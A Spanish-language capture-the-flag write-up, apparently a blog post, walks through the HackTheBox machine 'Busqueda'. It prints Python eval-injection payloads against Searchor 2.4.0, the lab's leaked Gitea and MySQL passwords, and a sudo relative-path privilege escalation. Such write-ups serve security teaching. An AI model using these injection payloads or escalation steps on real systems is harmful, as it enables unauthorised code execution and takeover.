---
layout: post
title: "HackTheBox - Busqueda (easy)"
categories: hackthebox/machines/easy
---

![busqueda-avatar](https://www.hackthebox.com/storage/avatars/a6942ab57b6a79f71240420442027334.png)

Busqueda es una maquina facil, comienza con una enumeracion web inicial, encontraremos y explotaremos una vulnerabilidad de Searchor que esta web utiliza.

Obtendremos una shell como el usuario svc, reutilizaremos credenciales y abusaremos de un script que llama a un archivo relativamente para escalar al usuario root.

### **Enumeracion**
Uso esta funcion para aumentar la la rapidez de enumeracion.
{% highlight bash %}
λ ubuntu-pc Busqueda → which scan
lscan () {
        target $1
        sudo nmap --min-rate 5000 -p- --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt
        ports=$(cat nmap/all-tcp-ports.txt | grep -oP "\d+/tcp" | cut -d / -f 1 | tr "\n"  "," |sed 's/,$//g')
        sudo nmap -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt
}
{% endhighlight %}

Nmap encuentra 2 puertos abiertos, ademas de una redireccion a http://searcher.htb/ que un script de nmap detecto.
{% highlight bash %}
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:

|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
{% endhighlight %}

Comprobamos usando curl.
{% highlight bash %}
λ ubuntu-pc Busqueda → curl --request GET --include --url http://10.10.11.208
HTTP/1.1 302 Found
Date: Thu, 10 Aug 2023 01:59:10 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://searcher.htb/
Content-Length: 282
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.208 Port 80</address>
</body></html>
{% endhighlight %}

De todas formas es posible que encontremos archivos en el servidor web fuzzeando.

Raramente no me funciona feroxbuster, usare ffuf.

Creo que feroxbuster no funciona porque la web no tiene un codigo de estado diferente al 302 ni una respuesta diferente en el body, feroxbuster no logra funcionar con el auto filtrado.
{% highlight bash %}
λ ubuntu-pc Busqueda → ffuf -u http://10.10.11.208/FUZZ -w ~/SecLists/Discovery/Web-Content/common.txt  -fs 282

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.208/FUZZ
 :: Wordlist         : FUZZ: /home/l1nvx/SecLists/Discovery/Web-Content/common.txt
 :: Header           : User-Agent: Mozilla/5.0 (Linux; Android 5.1; iris 600 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 282
________________________________________________

[Status: 302, Size: 309, Words: 18, Lines: 10, Duration: 264ms]
| URL | http://10.10.11.208/render?url=https://www.google.com
| --> | http://searcher.htb/?url=https://www.google.com
    * FUZZ: render?url=https://www.google.com

:: Progress: [4715/4715] :: Job [1/1] :: 149 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
{% endhighlight %}

Nos salta "render?url=https://www.google.com" redirect, pero es un falso positivo.

Lo comprobamos con curl, de alguna forma apache al existir cualquier parametro en la url, lo añadira a la url "http://searcher.htb/$param".
{% highlight bash %}
λ ubuntu-pc Busqueda → curl --request GET --include --url "http://10.10.11.208/notexists?fake=https://www.google.com"
HTTP/1.1 302 Found
Date: Thu, 10 Aug 2023 02:06:42 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://searcher.htb/?fake=https://www.google.com
Content-Length: 310
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/?fake=https://www.google.com">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.208 Port 80</address>
</body></html>
{% endhighlight %}

Añadimos el vhost a nuestro /etc/hosts.
{% highlight bash %}
λ ubuntu-pc Busqueda → echo 10.10.11.208 searcher.htb | sudo tee -a /etc/hosts
[sudo] contraseña para l1nvx:
10.10.11.208 searcher.htb
{% endhighlight %}

### **Configuracion De Burpsuite**

Algo que yo siempre hago y recomiendo es utilizar un scope usando expresiones regulares, porque existe la posibilidad que en el codigo de la web realize una peticion a un subdominio.

![burpsuite-scope](/assets/hackthebox/img/machines/easy/busqueda/burpsuite-scope.png)

Tambien recomiendo que burpsuite muestre **todo**.

![burpsuite-items](/assets/hackthebox/img/machines/easy/busqueda/burpsuite-items.png)

### **Searchor**

Esto muestra la web, (esta traducida).

Algo interesante es que esta utilizando Python Flask y menciona un repositorio (version 2.4.0).
https://github.com/ArjunSharda/Searchor

![web](/assets/hackthebox/img/machines/easy/busqueda/web.png)

### **Github**

Siempre en los repositorios hay que buscar vulnerabiliades-bugs en commits, security advisories, y sus releases.

Encontramos una vulnerabilidad que fue parcheada para la version 2.4.2.

Posiblemente esta version (2.4.0) sea vulnerable.

Suele ocurrir que versiones un poco anteriores al parche sean vulnerables y no mas antiguas.

![searchor-releases](/assets/hackthebox/img/machines/easy/busqueda/searchor-releases.png)

Este es el pull request de la vulnerabilidad.

![pull-request](/assets/hackthebox/img/machines/easy/busqueda/vuln-pull-request.png)

Aqui estan los cambios realizados, elimina la funcion eval.

![commit](/assets/hackthebox/img/machines/easy/busqueda/commit.png)

Con eso en mente, veamos que podemos hacer con el buscador en http://searchor.htb

Nos permite seleccionar un motor de busqueda y nuestra query "l1nvx", hay un campo "auto_redirect" que solamente te redireccionara a la plataforma de ese motor de busqueda con tu query.

![searchor-search](/assets/hackthebox/img/machines/easy/busqueda/search-web.png)

Al no marcar el auto redirect, nos muestra esto despues de realizar la peticion.

![redirect](/assets/hackthebox/img/machines/easy/busqueda/redirect.png)

Nos muestra burpsuite este body engine=Accuweather&query=l1nvx&auto_redirect=

Que engine y query son los campos que utliza la funcion eval.

![burpsuite-request](/assets/hackthebox/img/machines/easy/busqueda/burpsuite-request.png)

### **RCE**

Probando rce en el campo engine nos da exito localmente.

![engine-rce](/assets/hackthebox/img/machines/easy/busqueda/engine-rce.png)

Pero en el servidor remoto no funciona. (Invalid Engine!)

![engine-remote-rce](/assets/hackthebox/img/machines/easy/busqueda/engine-remote-rce.png)

En el campo query tambien no da exito en local.

![query-rce](/assets/hackthebox/img/machines/easy/busqueda/query-rce.png)

Tambien en el servidor remoto.

![query-remote-rce](/assets/hackthebox/img/machines/easy/busqueda/query-remote-rce.png)

Dejo el codigo de python que use para probar rce.

{% highlight python %}
# engine rce

class Engine:
    class Accuweather:
        def search(self, copy_url, open_web):
            return ""

query = "l1nvx"
copy = None
open = None
# RCE
engine = "Accuweather|(__import__('os').system('id'))#"
eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")


# query rce

class Engine:
    class Accuweather:
        def search(self, copy_url, open_web):
            return ""
        
engine = "Accuweather"
copy = None
open = None
# RCE
query = "' + str(__import__('os').system('id')) + '"
eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
{% endhighlight %}

### **User.txt**

Obtengo una shell de esta manera.

![svc-shell](/assets/hackthebox/img/machines/easy/busqueda/svc-shell.png)

En el directorio /home/svc encuentro user.txt

![user-txt](/assets/hackthebox/img/machines/easy/busqueda/user-txt.png)

### **Root.txt**

Encontramos credenciales del usuario cody en nuestro home.

![git-cody-password](/assets/hackthebox/img/machines/easy/busqueda/git-cody-password.png)

En la configuracion de apache2 vemos que hay 2 configuraciones de vhost, que pasan por diferentes servidores internos.

![apache2-sites](/assets/hackthebox/img/machines/easy/busqueda/apache-sites.png)

Añadimos el vhost a nuestro /etc/hosts y visitamos.

Las credenciales cody:jh1usoih2bkjaspwe92 son validas para gitea.searcher.htb

Encontramos solo 1 repositorio y otro usuario "administrator", el repositorio es el codigo de una implementacion del servicio de busqueda (searchor) que se utilizo en la web principal (proxy inverso).

![repository](/assets/hackthebox/img/machines/easy/busqueda/repository.png)

Con una contraseña podemos intentar utilizarla para sudo -l, en algunas maquinas es muy comun que se reutilizen contraseñas.

![sudo](/assets/hackthebox/img/machines/easy/busqueda/sudo.png)

Podemos ejecutar como root un script de python el cual no podemos leer.

Hay mas archivos en el directorio del script.

![script](/assets/hackthebox/img/machines/easy/busqueda/script.png)

Probando que parametros puedo utilizar en ese script, me imprime su ayuda.

![script-help](/assets/hackthebox/img/machines/easy/busqueda/script-help.png)

Los 2 ultimos comandos no funcionaron por alguna razon.

![script-results](/assets/hackthebox/img/machines/easy/busqueda/script-results.png)

Investigando los formatos que usa docker inspect encontre esta [pagina](https://docs.docker.com/engine/reference/commandline/inspect/)

Alfinal de la pagina muestra algo interesante **\{\{ json .Config \}\}**

{% highlight sh %}
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \{\{ json .Config \}\} 960873171e2e
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \{\{ json .Config \}\} f84a6b33fb5a
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
{% endhighlight %}

Datos interesantes.

{% highlight ruby %}
MYSQL_DATABASE=gitea
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
MYSQL_USER=gitea
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
GITEA__database__USER=gitea
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
{% endhighlight %}

No pude conectarme a mysql por alguna razon.

En gitea utilizando la credencial **yuiu1hoiu4i5ho1uh** con el otro usuario **administrator**, puedo iniciar sesion.

Tengo acceso a un nuevo repositorio.

![repository-2](/assets/hackthebox/img/machines/easy/busqueda/repository-2.png)

Son los scripts que estan en /opt/scripts que no puedo leerlos, pero en gitea si los puedo leer.

![repository-3](/assets/hackthebox/img/machines/easy/busqueda/repository-3.png)

El codigo del script que puedo ejecutar usando sudo, se puede abusar de el porque llama a un archivo relativamente, (lo puedo crear).

![repository-4](/assets/hackthebox/img/machines/easy/busqueda/repository-4.png)

La funcionm run_command, ejecuta una lista de argumentos ["./full-checkup.sh"] usando subprocess.

![repository-5](/assets/hackthebox/img/machines/easy/busqueda/repository-5.png)

Obtengo root.

![root](/assets/hackthebox/img/machines/easy/busqueda/root.png)
